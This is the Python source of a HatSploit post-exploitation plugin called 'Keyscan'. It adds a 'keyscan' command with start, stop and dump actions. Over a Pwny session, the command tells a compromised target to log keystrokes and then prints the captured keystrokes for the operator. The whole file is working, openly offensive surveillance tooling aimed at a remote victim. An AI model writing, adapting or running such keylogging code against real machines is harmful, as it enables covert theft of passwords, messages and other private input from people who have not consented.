"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

KEYSCAN_BASE = 11

KEYSCAN_START = tlv_custom_tag(API_CALL_STATIC, KEYSCAN_BASE, API_CALL)
KEYSCAN_STOP = tlv_custom_tag(API_CALL_STATIC, KEYSCAN_BASE, API_CALL + 1)
KEYSCAN_DUMP = tlv_custom_tag(API_CALL_STATIC, KEYSCAN_BASE, API_CALL + 2)

TLV_TYPE_KEYSCAN_DATA = tlv_custom_type(TLV_TYPE_STRING, KEYSCAN_BASE, API_TYPE)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Keyscan Plugin",
            'Plugin': "keyscan",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Capture keystrokes on the target.",
        })

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "keyscan",
                'Description': "Capture keystrokes on the target.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('action',),
                        {
                            'help': "Action: start, stop, or dump.",
                            'choices': ['start', 'stop', 'dump'],
                        }
                    ),
                ]
            })
        ]

    def keyscan(self, args):
        if args.action == 'start':
            result = self.session.send_command(
                tag=KEYSCAN_START,
                plugin=self.plugin,
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to start keylogger!")
                return

            self.print_success("Keylogger started.")

        elif args.action == 'stop':
            result = self.session.send_command(
                tag=KEYSCAN_STOP,
                plugin=self.plugin,
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to stop keylogger!")
                return

            self.print_success("Keylogger stopped.")

        elif args.action == 'dump':
            result = self.session.send_command(
                tag=KEYSCAN_DUMP,
                plugin=self.plugin,
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Keylogger not running or dump failed!")
                return

            data = result.get_string(TLV_TYPE_KEYSCAN_DATA)
            if data:
                self.print_information(data)
            else:
                self.print_warning("No keystrokes captured yet.")

    def load(self):
        pass
